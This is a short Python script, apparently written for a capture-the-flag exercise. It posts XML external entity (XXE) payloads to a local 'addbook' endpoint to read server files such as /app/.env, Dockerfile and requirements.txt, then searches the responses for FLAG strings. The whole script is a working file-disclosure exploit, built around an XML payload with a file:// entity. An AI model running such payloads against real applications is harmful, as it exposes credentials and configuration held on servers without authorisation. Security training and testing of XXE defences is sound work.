import requests
import re

files_to_test = [
    '/app/requirements.txt',
    '/app/README.md', 
    '/app/README.txt',
    '/app/config.txt',
    '/app/.env',
    '/app/Dockerfile',
    '/Dockerfile',
    '/README.md',
    '/requirements.txt'
]

base_url = 'http://127.0.0.1:5000/addbook'

print("[*] Testing XXE payloads for FLAG references\n")

for filepath in files_to_test:
    xml_payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file://{filepath}">]>
<Book>
    <Title>Read {filepath}</Title>
    <ISBN>&file;</ISBN>
    <Editor>Test</Editor>
    <Publisher>Test</Publisher>
    <Chapters></Chapters>
</Book>'''
    
    try:
        response = requests.post(base_url, data={'xml': xml_payload}, timeout=5)
        
        print(f"[*] {filepath}")
        print(f"    Status: {response.status_code}")
        
        # Search for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        if flag_matches:
            print(f"[!] FLAG FOUND: {flag_matches}")
            print(f"[!] Full Response:\n{response.text}")
            print("")
        elif response.status_code == 200:
            print(f"    Response length: {len(response.text)}B")
            # Print response to analyze
            print(f"    Content:\n{response.text}")
            print("")
            
    except Exception as e:
        print(f"    Error: {e}\n")

